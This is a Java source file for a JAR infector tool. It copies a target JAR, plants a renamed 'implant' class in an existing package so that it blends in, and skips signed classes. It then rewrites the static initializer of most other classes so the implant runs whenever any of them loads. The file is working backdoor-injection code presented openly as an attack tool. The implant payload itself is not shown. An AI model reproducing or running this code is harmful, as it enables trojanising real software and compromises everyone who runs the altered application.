package org.example.injector;

import javassist.CtClass;
import javassist.bytecode.*;
import org.example.implants.ClassImplant;

import java.io.DataInputStream;
import java.io.IOException;
import java.nio.ByteBuffer;
import java.nio.ByteOrder;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.jar.JarEntry;

import static org.example.injector.Helpers.*;

public class ClassInjector {
    final static String IMPLANT_CLASS_NAME = "Init";
    private final Class<?> implantClass;

    ClassInjector(Class<?> implantClass) {
        this.implantClass = implantClass;
    }

    public static void main(String[] args) {
        if (args.length < 2) {
            System.exit(1);
        }

        ClassInjector injector = new ClassInjector(ClassImplant.class);
        try {
            Path targetPath = Path.of(args[0]);
            Path outputPath = Path.of(args[1]);
            System.out.println("[i] Target JAR: " + targetPath);
            System.out.println("[i] Output JAR: " + outputPath);
            if (!Files.exists(targetPath) && !Files.isRegularFile(targetPath)) {
                System.out.println("[!] Target JAR is not a regular existing file.");
                System.exit(1);
            }
            if (Files.exists(outputPath) && targetPath.toRealPath().equals(outputPath.toRealPath())) {
                System.out.println("[-] Target JAR and output JAR cannot be the same.");
                System.exit(1);
            }
            if (injector.infect(targetPath, outputPath)) {
                System.out.println("[+] Infected '" + targetPath + "'. Modified JAR available at: " + outputPath);
            } else {
                System.out.println("[-] Did not infect '" + targetPath + "'.");
            }
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    public boolean infect(final Path targetJarFilePath, Path outputJar) throws IOException {
        ClassFile implantedClass = null;
        boolean foundSignedClasses = false;

        try (JarFileFiddler fiddler = JarFileFiddler.open(targetJarFilePath, outputJar)) {
            for (JarFileFiddler.WrappedJarEntry entry : fiddler) {
                if (!entry.getName().endsWith(".class")) {
                    entry.passOn();
                    continue;
                }
                if (entry.getEntry().getCodeSigners() != null) {
                    foundSignedClasses = true;
                    entry.passOn();
                    continue;
                }
                if (entry.getName().equals(IMPLANT_CLASS_NAME + ".class")) {
                    System.out.println("[-] WARNING: It looks like this JAR may already be infected. Proceeding anyway.");
                    entry.passOn();
                    continue;
                }

                try (DataInputStream in = new DataInputStream(entry.getContent())) {
                    ClassFile currentlyProcessing = new ClassFile(in);

                    String targetPackageName = parsePackageNameFromFqcn(currentlyProcessing.getName());
                    if (implantedClass == null) {
                        /*
                         * Since there are other classes in this directory, the implant will blend in better here.
                         * Any directory will do and only one occurrence of the implant class in the JAR is enough.
                         */
                        ClassFile implant = ImplantReader.findAndReadClassFile(implantClass);
                        deepRenameClass(implant, targetPackageName, IMPLANT_CLASS_NAME);
                        JarEntry newJarEntry = convertToJarEntry(implant);
                        implant.write(fiddler.addNewEntry(newJarEntry));
                        System.out.println("[+] Wrote implant class '" + newJarEntry.getName() + "' to JAR file.");

                        implantedClass = implant;
                    }

                    /*
                     * As the class is now planted into the JAR, it must be referred to somehow (by anything running)
                     * in order to be loaded. Modify the class initializer (static block) of all eligible classes to
                     * explicitly use the implant class. The implant will thus be called upon once per class that is
                     * infected. Remember that a class initializer will run only once per class.
                     * Several classes are infected because it's difficult to know what specific class will be used
                     * by an app.
                     */
                    modifyClinit(currentlyProcessing, implantedClass);
                    currentlyProcessing.write(entry.addOnly());
                    System.out.println("[+] Modified class initializer for '" + currentlyProcessing.getName() + "'.");
                } catch (ClassNotFoundException e) {
                    throw new RuntimeException(e);
                }
            }

            if (foundSignedClasses) {
                System.out.println("[-] Found signed classes. These were not considered for infection.");
            }

            return implantedClass != null;
        }
    }

    private static void modifyClinit(ClassFile targetClass, ClassFile implantClass) {
        MethodInfo implantInitMethod = implantClass.getMethod("implant");
        if (implantInitMethod == null) {
            throw new UnsupportedOperationException("Implant class does not have a 'public static implant()' function.");
        }

        MethodInfo currentClinit = targetClass.getMethod(MethodInfo.nameClinit);
        if (currentClinit == null) {
            // There are no static blocks in this class, create an empty one
            currentClinit = new MethodInfo(targetClass.getConstPool(), MethodInfo.nameClinit, "()V");
            setStaticFlagForMethod(currentClinit);
            Bytecode stubCode = new Bytecode(targetClass.getConstPool(), 0, 0);
            stubCode.addReturn(CtClass.voidType);
            currentClinit.setCodeAttribute(stubCode.toCodeAttribute());

            try {
                targetClass.addMethod(currentClinit);
            } catch (DuplicateMemberException e) {
                throw new RuntimeException("Internal error: <clinit> already exist despite not existing", e);
            }
        }

        // Modify the clinit method of the target class to run the implant method (before its own code)
        Bytecode additionalClinitCode = new Bytecode(targetClass.getConstPool());
        additionalClinitCode.addInvokestatic(implantClass.getName(), implantInitMethod.getName(), implantInitMethod.getDescriptor());
        CodeAttribute additionalClinitCodeAttr = additionalClinitCode.toCodeAttribute();
        CodeAttribute currentClinitCodeAttr = currentClinit.getCodeAttribute();
        ByteBuffer concatenatedCode = ByteBuffer.allocate(additionalClinitCodeAttr.getCodeLength() + currentClinit.getCodeAttribute().getCodeLength());
        concatenatedCode.put(additionalClinitCodeAttr.getCode());
        concatenatedCode.put(currentClinitCodeAttr.getCode());
        CodeAttribute newCodeAttribute = new CodeAttribute(targetClass.getConstPool(), currentClinitCodeAttr.getMaxStack(), currentClinitCodeAttr.getMaxLocals(), concatenatedCode.array(), currentClinitCodeAttr.getExceptionTable());
        currentClinit.setCodeAttribute(newCodeAttribute);
    }

    private static void deepRenameClass(ClassFile classFile, String newPackageName, String newClassName) {
        String newFqcn = newPackageName + "." + newClassName;
        String newSourceFileName = newClassName + ".java";

        AttributeInfo sourceFileAttr = classFile.getAttribute(SourceFileAttribute.tag);
        if (sourceFileAttr != null) {
            ByteBuffer sourceFileInfo = ByteBuffer.wrap(sourceFileAttr.get());
            sourceFileInfo.order(ByteOrder.BIG_ENDIAN);
            if (sourceFileInfo.limit() != 2) {
                throw new RuntimeException("Unexpected SourceFileAttribute length: " + sourceFileInfo.limit());
            }
            int fileNameIndex = sourceFileInfo.getShort();
            String fileName = classFile.getConstPool().getUtf8Info(fileNameIndex);
            String expectedName = parseClassNameFromFqcn(classFile.getName());
            if (!fileName.startsWith(expectedName)) {
                throw new RuntimeException("Unexpected SourceFileAttribute: Expected class to start with '" + expectedName + "'.");
            }
            int newClassNameIndex = classFile.getConstPool().addUtf8Info(newSourceFileName);
            if (newClassNameIndex < 0 || newClassNameIndex > 65535) {
                throw new RuntimeException("Unexpected index in ConstPool: " + newClassNameIndex);
            }
            sourceFileInfo.flip();
            sourceFileInfo.putShort((short) newClassNameIndex);
            sourceFileAttr.set(sourceFileInfo.array());
        }

        classFile.setName(newFqcn);
        classFile.compact();
    }
}
